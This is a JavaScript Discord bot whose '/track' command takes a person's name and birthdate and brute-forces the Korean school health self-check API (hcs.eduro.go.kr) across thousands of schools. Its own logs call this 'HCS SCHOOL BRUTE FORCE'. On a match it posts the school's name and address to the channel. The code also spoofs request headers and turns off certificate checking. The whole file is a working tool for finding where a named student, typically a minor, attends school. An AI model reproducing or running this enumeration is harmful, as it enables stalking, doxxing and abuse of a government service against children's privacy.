//config start

const adminList = [
    //"Your Discord Account (EX. Nefew#1234) + 작성후 주석제거 바람. "
];

const gameName = "https://nefew.kr/";

const prefix = "$";

//config end



import nodeFetch from "node-fetch";
import * as fs from "fs";
import * as Discord from "discord.js";
import { Agent } from "https"
const Client = new Discord.Client({ "intents": ["GUILDS", "GUILD_MESSAGES", "DIRECT_MESSAGES"], "partials": ["CHANNEL"] });
import JSEncrypt from "jsencrypt";
import fetchCookie from "fetch-cookie";
import chalk from "chalk";

const fetch = fetchCookie(nodeFetch);

const defaultHeaders = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-GB,en;q=0.9,ko-KR;q=0.8,ko;q=0.7,ja-JP;q=0.6,ja;q=0.5,zh-TW;q=0.4,zh;q=0.3,en-US;q=0.2",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Referer": "https://hcs.eduro.go.kr/",
    "X-Forwarded-For": "hcs.eduro.go.kr",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "X-Requested-With": "XMLHttpRequest"
};

const defaultAgent = new Agent({
    rejectUnauthorized: false
});

const cityCodes = {
    "서울특별시": "sen",
    "부산광역시": "pen",
    "대구광역시": "dge",
    "인천광역시": "ice",
    "광주광역시": "gen",
    "대전광역시": "dje",
    "울산광역시": "use",
    "세종특별자치시": "sje",
    "경기도": "goe",
    "강원도": "kwe",
    "충청북도": "cbe",
    "충청남도": "cne",
    "전라북도": "jbe",
    "전라남도": "jne",
    "경상북도": "gbe",
    "경상남도": "gne",
    "제주특별자치도": "jje"
};

async function fetchHcs(path = "/", method = "GET", data = {}, endpoint = "hcs.eduro.go.kr", token = null) {
    const query = method === "GET" ? "?" + new URLSearchParams(data).toString() : "";
    const url = "https://" + endpoint + path + query;
    const response = await fetch(url, {
        method: method,
        agent: defaultAgent,
        headers: {
            "Content-Type": `application/${method === "GET" ? "x-www-form-urlencoded" : "json"};charset=UTF-8`,
            "Authorization": token,
            ...defaultHeaders,
        },
        body: method === "POST" ? JSON.stringify(data) : undefined
    });
    let value = await response.text()
    try {
        value = JSON.parse(value)
    } catch (ignored) {
    };
    return value;
};

async function searchSchool(schoolName) {
    const response = await fetchHcs("/v2/searchSchool", "GET", { orgName: schoolName })
    const schoolList = Object(response["schulList"])
    return schoolList.map(school => {
        return {
            name: school["kraOrgNm"],
            nameEn: school["engOrgNm"],
            city: school["lctnScNm"],
            address: school["addres"],
            endpoint: school["atptOfcdcConctUrl"],
            schoolCode: school["orgCode"],
            searchKey: response.key
        };
    });
};

function encryptData(data) {
    const jsEncrypt = new JSEncrypt();
    jsEncrypt.setPublicKey("30820122300d06092a864886f70d01010105000382010f003082010a0282010100f357429c22add0d547ee3e4e876f921a0114d1aaa2e6eeac6177a6a2e2565ce9593b78ea0ec1d8335a9f12356f08e99ea0c3455d849774d85f954ee68d63fc8d6526918210f28dc51aa333b0c4cdc6bf9b029d1c50b5aef5e626c9c8c9c16231c41eef530be91143627205bbbf99c2c261791d2df71e69fbc83cdc7e37c1b3df4ae71244a691c6d2a73eab7617c713e9c193484459f45adc6dd0cba1d54f1abef5b2c34dee43fc0c067ce1c140bc4f81b935c94b116cce404c5b438a0395906ff0133f5b1c6e3b2bb423c6c350376eb4939f44461164195acc51ef44a34d4100f6a837e3473e3ce2e16cedbe67ca48da301f64fc4240b878c9cc6b3d30c316b50203010001");
    return jsEncrypt.encrypt(data);
};

function FUNCTION_DELAY(_TIME) {
    return new Promise(resolve => setTimeout(resolve, _TIME));
};

Client.once("ready", async function (bot) {
    console.log(`[PROCESS RUNNING] BOT IS READY! LOGGED IN AS " ${bot.user.tag} "`);

    while (true) {
        Client.user.setPresence({
            status: "idle",
            game: {
                name: gameName,
                type: "PLAYING"
            }
        });
        Client.user.setActivity(gameName, { type: "PLAYING" });
        await FUNCTION_DELAY(60000);
    };
});

Client.on("interactionCreate", async function (interaction) {
    if (!interaction.isCommand()) {
        return;
    };

    if (interaction.commandName === "track") {
        const name = interaction.options.getString("이름");
        const birthDate = interaction.options.getString("생년월일");
        const cityName = interaction.options.getString("도시");
        try {
            var schoolLevel = birthDate.substring(0, 2);
            if (birthDate.length === 6 && !isNaN(birthDate) && 4 <= schoolLevel && schoolLevel <= 15 && birthDate.substring(2, 4) <= 12 && birthDate.substring(4, 6) <= 31) {
                await interaction.reply({ "embeds": [new Discord.MessageEmbed().setTitle("🛠️ 트래킹 준비 중...").setColor("BLUE")] });

                if (10 <= schoolLevel) {
                    schoolLevel = "초등학교";
                } else if (schoolLevel <= 6) {
                    schoolLevel = "고등학교";
                } else {
                    schoolLevel = "중학교";
                };

                var schoolData = JSON.parse(fs.readFileSync("./School/newSchoolData.json").toString("utf8"));
                if (cityName) {
                    console.log(chalk.blueBright("[PROCESS RUNNING] ") + chalk.yellowBright("HCS SCHOOL BRUTE FORCE : TYPE CITY"));
                    Object.keys(schoolData).filter(code => cityCodes[schoolData[code].city] !== cityName.toLowerCase() && delete schoolData[code]);
                } else {
                    console.log(chalk.blueBright("[PROCESS RUNNING] ") + chalk.yellowBright("HCS SCHOOL BRUTE FORCE : TYPE DEFAULT"));
                };

                const schoolTasks = Object.keys(schoolData).filter(code => schoolData[code].name.includes(schoolLevel)).reduce(function (resultArray, item, i) {
                    const chunkIndex = Math.floor(i / 300);
                    if (!resultArray[chunkIndex]) {
                        resultArray[chunkIndex] = [];
                    }
                    resultArray[chunkIndex].push(item);
                    return resultArray;
                }, []);

                await interaction.editReply({
                    "embeds": [
                        new Discord.MessageEmbed()
                            .setTitle(`🛠️ 0/${schoolTasks.length} 페이지 트래킹 중...`)
                            .setColor("BLUE")
                    ]
                });

                var taskSuccess = 0;
                var taskIndex = 0;

                for (const schoolTask of schoolTasks) {
                    try {
                        taskIndex++;
                        console.log(chalk.blueBright("[PROCESS RUNNING] ") + chalk.yellowBright("HCS SCHOOL BRUTE FORCE : TRACKING PAGE " + taskIndex + "/" + schoolTasks.length));
                        await interaction.editReply({ "embeds": [new Discord.MessageEmbed().setTitle(`🛠️ ${taskIndex}/${schoolTasks.length} 페이지 트래킹 중...`).setColor("BLUE")] });
                        await Promise.all(schoolTask.map(async function (task) {
                            const schools = await searchSchool(schoolData[task].name);
                            var school;
                            for (var i = 0; i < schools.length; i++) {
                                if (schools[i].city == schoolData[task].city) {
                                    school = schools[i];
                                    break;
                                };
                            };

                            const data = {
                                birthday: encryptData(birthDate),
                                loginType: 'school',
                                name: encryptData(name),
                                orgCode: task,
                                stdntPNo: null,
                                searchKey: school.searchKey
                            };
                            const response = await fetchHcs('/v2/findUser', 'POST', data, schoolData[task].endpoint);

                            if (!response.token || response['isError']) {

                            } else {
                                console.log(chalk.blueBright("[PROCESS RUNNING] ") + chalk.yellowBright("HCS SCHOOL BRUTE FORCE : TRACK SUCCESS"));
                                await interaction.channel.send({
                                    "embeds": [
                                        new Discord.MessageEmbed()
                                            .setTitle("✅ **트래킹 성공!**")
                                            .addFields(
                                                {
                                                    "name": "🌻 **입력된 정보** 🌻",
                                                    "value": "```" +
                                                        "\n- 이름 : " + name +
                                                        "\n- 생년월일 : " + birthDate +
                                                        "\n```",
                                                    "inline": false
                                                },
                                                {
                                                    "name": "🚀 **결과 정보** 🚀",
                                                    "value": "```" +
                                                        "\n<< " + schoolData[task].city + " " + schoolData[task].name + " 에서 " + name + " 님의 정보를 찾았습니다! >>" +
                                                        "\n" + schoolData[task].address +
                                                        "\n```",
                                                    "inline": false
                                                }
                                            )
                                            .setColor("GREEN")
                                    ]
                                });
                                taskSuccess++;
                            };
                        }));
                    } catch {

                    };
                };

                if (taskSuccess) {
                    await interaction.editReply({
                        "embeds": [
                            new Discord.MessageEmbed()
                            .setTitle("✅ **트래킹 완료!**")
                            .addFields(
                                {
                                    "name": "🚀 **결과 정보** 🚀",
                                    "value": "```" +
                                        "\n<< 채널에 올라온 가장 최신 임베드를 확인해주세요! >>" +
                                        "\n```",
                                    "inline": false
                                }
                            )
                            .setColor("BLUE")
                        ]
                    });

                    await interaction.channel.send({
                        "embeds": [
                            new Discord.MessageEmbed()
                                .setTitle("✅ **트래킹 완료!**")
                                .addFields(
                                    {
                                        "name": "🌻 **입력된 정보** 🌻",
                                        "value": "```" +
                                            "\n- 이름 : " + name +
                                            "\n- 생년월일 : " + birthDate +
                                            "\n```",
                                        "inline": false
                                    },
                                    {
                                        "name": "🚀 **결과 정보** 🚀",
                                        "value": "```" +
                                            "\n<< " + name + " 님의 정보를 " + taskSuccess + " 개 찾았습니다! >>" +
                                            "\n```",
                                        "inline": false
                                    }
                                )
                                .setColor("GREEN")
                        ]
                    });
                } else {
                    await interaction.editReply({
                        "embeds": [
                            new Discord.MessageEmbed()
                            .setTitle("❌ **트래킹 실패!**")
                            .addFields(
                                {
                                    "name": "🚀 **결과 정보** 🚀",
                                    "value": "```" +
                                        "\n<< 채널에 올라온 가장 최신 임베드를 확인해주세요! >>" +
                                        "\n```",
                                    "inline": false
                                }
                            )
                            .setColor("BLUE")
                        ]
                    });

                    await interaction.channel.send({
                        "embeds": [
                            new Discord.MessageEmbed()
                                .setTitle("❌ **오류 발생!**")
                                .addFields(
                                    {
                                        "name": "🌻 **입력된 정보** 🌻",
                                        "value": "```" +
                                            "\n- 이름 : " + name +
                                            "\n- 생년월일 : " + birthDate +
                                            "\n```",
                                        "inline": false
                                    },
                                    {
                                        "name": "💥 **오류 내용** 💥",
                                        "value": "```" +
                                            "\n<< " + name + " 님의 정보를 찾지 못했습니다! >>" +
                                            "\n```",
                                        "inline": false
                                    }
                                )
                                .setColor("RED")
                        ]
                    });
                };

                await interaction.channel.send(interaction.user.toString()).then(m => m.delete());
            } else {
                await interaction.reply({
                    "embeds": [
                        new Discord.MessageEmbed()
                            .setTitle("❌ **오류 발생!**")
                            .addFields(
                                {
                                    "name": "🌻 **입력된 정보** 🌻",
                                    "value": "```" +
                                        "\n- 이름 : " + name +
                                        "\n- 생년월일 : " + birthDate +
                                        "\n```",
                                    "inline": false
                                },
                                {
                                    "name": "💥 **오류 내용** 💥",
                                    "value": "```" +
                                        "\n<< 생년월일 내용을 다시 확인해주세요! >>" +
                                        "\n```",
                                    "inline": false
                                }
                            )
                            .setColor("RED")
                    ]
                });
            };
        } catch (e) {
            console.log(e);
            await interaction.channel.send({
                "embeds": [
                    new Discord.MessageEmbed()
                        .setTitle("❌ **오류 발생!**")
                        .addFields(
                            {
                                "name": "🌻 **입력된 정보** 🌻",
                                "value": "```" +
                                    "\n- 이름 : " + name +
                                    "\n- 생년월일 : " + birthDate +
                                    "\n```",
                                "inline": false
                            },
                            {
                                "name": "💥 **오류 내용** 💥",
                                "value": "```" +
                                    "\n" + e +
                                    "\n```",
                                "inline": false
                            }
                        )
                        .setColor("RED")
                ]
            });
        };
    };
});

Client.on("messageCreate", async message => {
    if (message.author.bot) return;
    if (message.channel.type === "dm") return;

    if (message.content == prefix + "작동") {
        await message.reply({
            "embeds": [
                new Discord.MessageEmbed()
                    .setColor("#0099ff")
                    .setTitle("**봇 작동중!**")
            ],
            "allowedMentions": {
                repliedUser: false
            }
        });
    };

    if (message.content == prefix + "명령어생성") {
        try {
            for (const command of await message.guild.commands.fetch()) {
                await message.guild.commands.delete(command[0]);
            };
            const cityArray = [];
            for (const city of Object.keys(cityCodes)) {
                cityArray.push({ "name": city, "value": cityCodes[city].toUpperCase() });
            };
            await message.guild.commands.create({ "name": "track", "description": "학교 정보 트래킹", "type": "CHAT_INPUT", "options": [{ "type": "STRING", "name": "이름", "description": "예) 홍길동", "required": true }, { "type": "STRING", "name": "생년월일", "description": "예) 051231", "required": true }, { "type": "STRING", "name": "도시", "description": "예) 서울특별시", "required": false, "choices": cityArray }] });
            await message.reply({ "embeds": [new Discord.MessageEmbed().setTitle("✅ 슬래시 명령어 등록 완료!").setColor("GREEN")] });
        } catch (e) {
            message.reply("명령어 빌드권한 필요");
        };
    };
});

fs.readFile("./token.txt", 'utf8', function (err, data) {
    if (err) {
        throw err;
    };

    Client.login(data);
});
